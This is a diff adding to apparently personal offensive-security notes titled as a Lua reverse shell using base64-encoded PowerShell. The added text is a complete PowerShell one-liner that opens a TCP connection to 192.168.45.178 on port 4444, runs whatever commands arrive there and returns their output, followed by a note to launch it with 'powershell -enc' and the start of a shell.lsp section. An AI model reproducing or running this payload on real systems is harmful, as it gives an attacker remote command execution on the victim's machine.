@@ -1,4 +1,12 @@
 # lua reverse shell with powershell base64 encoded
+Payload:
+```
+$client = New-Object System.Net.Sockets.TCPClient('192.168.45.178',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+![image](https://github.com/user-attachments/assets/c857de33-9485-4638-b797-1ac56eb6fe4d)  
+Use powershell -enc base64_encoded_payalod to execute reverse shell
+
+shell.lsp
 ```
 <div style="margin-left:auto;margin-right: auto;width: 350px;">
 
